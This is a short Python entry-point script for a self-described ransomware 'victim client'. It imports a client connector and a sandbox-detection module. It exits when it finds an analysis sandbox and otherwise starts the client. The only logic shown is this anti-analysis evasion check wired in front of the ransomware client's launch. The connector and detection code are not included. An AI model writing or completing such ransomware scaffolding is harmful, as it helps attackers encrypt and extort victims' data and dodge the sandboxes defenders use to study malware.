#!/usr/bin/env python3
"""
Ransomware Victim Client - Main Entry Point
"""
import sys
import os

# Add current directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from client import ClientConnector
import sandbox_detection


def main():
    print("=== Ransomware Client Starting ===")

    # Run sandbox detection first
    if sandbox_detection.main():
        print("[!] Sandbox environment detected - delaying execution")
        return

    # Initialize and start client
    client = ClientConnector()
    client.start_client()


if __name__ == "__main__":
    main()